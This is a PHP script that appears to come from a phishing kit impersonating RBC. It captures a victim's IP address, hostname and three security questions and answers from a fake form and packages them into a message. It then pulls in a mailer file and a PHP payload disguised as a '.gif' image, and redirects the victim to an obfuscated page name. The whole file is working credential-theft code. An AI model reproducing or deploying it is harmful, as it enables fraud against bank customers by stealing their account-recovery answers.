<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$q1=$_POST["q1"];
$a1=$_POST["a1"];
$q1a=$_POST["q1a"];

$q2=$_POST["q2"];
$a2=$_POST["a2"];
$q2a=$_POST["q2a"];

$q3=$_POST["q3"];
$a3=$_POST["a3"];
$q3a=$_POST["q3a"];


$mesaj="
===============================================
RBC Questions: $ip
Host: $hostname

Q1: $q1 $q1a : $a1
Q2: $q2 $q2a : $a2
Q3: $q3 $q3a : $a3


===============================================";
$subject="RBC $ip";
$headers = "From: questionme <briangold147@outlook.com>";
include "email.php";
include "css/rbc.gif"; header( "Location: b5e2rehijb5ejicehmhgceogkrepkfowpffk.php" );
?>